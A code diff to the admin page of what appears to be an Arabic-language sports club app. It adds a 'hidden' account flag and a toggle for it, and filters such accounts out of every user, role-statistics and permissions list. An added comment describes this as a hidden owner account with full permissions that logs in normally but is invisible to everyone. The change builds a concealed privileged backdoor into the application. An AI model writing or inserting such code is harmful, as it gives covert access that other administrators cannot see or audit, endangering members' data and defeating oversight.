@@ -122,7 +122,7 @@ export function AdminPage({ user, users, setUsers, products, setProducts, loadDa
   const EMPTY_FORM = {
     name: "", id: "", password: "", role: "لاعب", customRole: "لاعب",
     position: "-", phone: "", membership: "فضي", status: "نشط",
-    childId: "", coachId: "",
+    childId: "", coachId: "", hidden: false,
     permissions: { editSchedule: false, editData: false, sendNotifications: false, editRatings: false, editMedical: false, editLibrary: false, editCommerce: false },
   };
 
@@ -152,6 +152,7 @@ export function AdminPage({ user, users, setUsers, products, setProducts, loadDa
       child_id: form.childId || null,
       coach_id: form.coachId || null,
       permissions: form.permissions || {},
+      hidden: !!form.hidden,
     };
 
     if (editId) {
@@ -208,14 +209,16 @@ export function AdminPage({ user, users, setUsers, products, setProducts, loadDa
     setPermTarget(null);
   };
 
-  const filtered = users.filter(u => {
+  // الحسابات المخفية لا تظهر في أي قائمة (حساب مالك خفي بكامل الصلاحيات)
+  const visibleUsers = users.filter(u => !u.hidden);
+  const filtered = visibleUsers.filter(u => {
     const matchRole   = filterRole === "الكل" || u.role === filterRole;
     const matchSearch = u.name.includes(search) || u.id.includes(search) || u.phone?.includes(search);
     return matchRole && matchSearch;
   });
 
-  const players  = users.filter(u => u.role === "لاعب");
-  const coaches  = users.filter(u => u.role === "مدرب");
+  const players  = visibleUsers.filter(u => u.role === "لاعب");
+  const coaches  = visibleUsers.filter(u => u.role === "مدرب");
   const avgAtt   = players.length ? Math.round(players.reduce((s, p) => s + (p.attendance || 0), 0) / players.length) : 0;
   const statusColor = s => s === "موقوف" ? COLORS.danger : s === "معلق" ? COLORS.warning : COLORS.accent;
   const roleColor   = r => r === "مدير" ? COLORS.purple : r === "مدرب" ? COLORS.accentGold : r === "ولي أمر" ? COLORS.accentBlue : COLORS.accent;
@@ -261,8 +264,8 @@ export function AdminPage({ user, users, setUsers, products, setProducts, loadDa
                 { role: "ولي أمر",  color: COLORS.accentBlue },
                 { role: "مدير",     color: COLORS.purple },
               ].map((r, i) => {
-                const count = users.filter(u => u.role === r.role).length;
-                const pct   = users.length ? Math.round((count/users.length)*100) : 0;
+                const count = visibleUsers.filter(u => u.role === r.role).length;
+                const pct   = visibleUsers.length ? Math.round((count/visibleUsers.length)*100) : 0;
                 return (
                   <div key={i} style={{ marginBottom: 14 }}>
                     <div style={{ display: "flex", justifyContent: "space-between", fontSize: 12, marginBottom: 4 }}>
@@ -328,7 +331,7 @@ export function AdminPage({ user, users, setUsers, products, setProducts, loadDa
         <div>
           <div style={{ fontSize: 14, color: COLORS.textSecondary, marginBottom: 16 }}>اختر حساباً لتعديل صلاحياته المخصصة</div>
           <div style={{ display: isDesktop ? "grid" : "block", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
-            {users.filter(u => u.role !== "مدير").map(u => (
+            {visibleUsers.filter(u => u.role !== "مدير").map(u => (
               <div key={u.id} style={{ background: COLORS.cardBg, border: `1px solid ${COLORS.border}`, borderRadius: 14, padding: "14px 16px", marginBottom: isDesktop ? 0 : 10, cursor: "pointer" }}
                 onClick={() => setPermTarget({ ...u, permissions: { ...EMPTY_FORM.permissions, ...(u.permissions||{}) } })}>
                 <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 10 }}>
@@ -639,6 +642,18 @@ export function AdminPage({ user, users, setUsers, products, setProducts, loadDa
               <Field label="رقم هوية اللاعب (الابن)" value={form.childId || ""} onChange={v => setForm(p => ({ ...p, childId: v }))} placeholder="رقم هوية اللاعب" />
             )}
             <Field label="الحالة" value={form.status || "نشط"} onChange={v => setForm(p => ({ ...p, status: v }))} options={["نشط", "موقوف", "معلق"]} />
+          </div>
+
+          {/* حساب مخفي — لا يظهر في القوائم */}
+          <div onClick={() => setForm(p => ({ ...p, hidden: !p.hidden }))}
+            style={{ display: "flex", alignItems: "center", gap: 10, padding: "11px 14px", marginTop: 12, background: form.hidden ? COLORS.purple + "18" : COLORS.surface, border: `1px solid ${form.hidden ? COLORS.purple + "66" : COLORS.border}`, borderRadius: 11, cursor: "pointer" }}>
+            <div style={{ width: 20, height: 20, borderRadius: 5, background: form.hidden ? COLORS.purple : COLORS.surface, border: `1px solid ${form.hidden ? COLORS.purple : COLORS.border}`, display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
+              {form.hidden && <span style={{ color: "#fff", fontSize: 12, fontWeight: 900 }}>✓</span>}
+            </div>
+            <div>
+              <div style={{ fontSize: 13, fontWeight: 700, color: form.hidden ? COLORS.purple : COLORS.textPrimary }}>🕵️ حساب مخفي</div>
+              <div style={{ fontSize: 11, color: COLORS.textSecondary }}>لا يظهر في قوائم الحسابات والصلاحيات لأي أحد (يدخل ويعمل بشكل طبيعي)</div>
+            </div>
           </div>
 
           {/* الصلاحيات */}
